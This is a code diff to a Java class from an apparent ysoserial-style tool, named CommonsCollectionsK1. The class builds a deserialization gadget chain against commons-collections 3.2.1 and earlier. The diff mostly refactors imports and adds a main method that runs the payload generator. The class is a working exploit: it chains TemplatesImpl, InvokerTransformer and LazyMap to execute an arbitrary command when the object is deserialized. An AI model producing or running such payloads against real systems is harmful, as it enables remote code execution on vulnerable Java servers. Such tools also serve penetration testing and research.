@@ -1,5 +1,6 @@
 package A.R.ysogate.payloads.gadgets;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
@@ -7,8 +8,8 @@ import org.apache.commons.collections.map.LazyMap;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Gadgets;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.Reflections;
 
 import java.util.HashMap;
 import java.util.Map;
@@ -18,7 +19,7 @@ import java.util.Map;
  */
 @Dependencies({"commons-collections:commons-collections:<=3.2.1"})
 @Authors({"KORLR"})
-public class CommonsCollectionsK1 implements ObjectPayload {
+public class CommonsCollectionsK1 implements ObjectPayload<Map> {
 
 	public Map getObject(String command) throws Exception {
 		Object                  templates   = Gadgets.createTemplatesImpl(command);
@@ -31,5 +32,9 @@ public class CommonsCollectionsK1 implements ObjectPayload {
 		innerMap.clear();
 		Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
 		return outerMap;
+	}
+
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(CommonsCollectionsK1.class, args);
 	}
 }
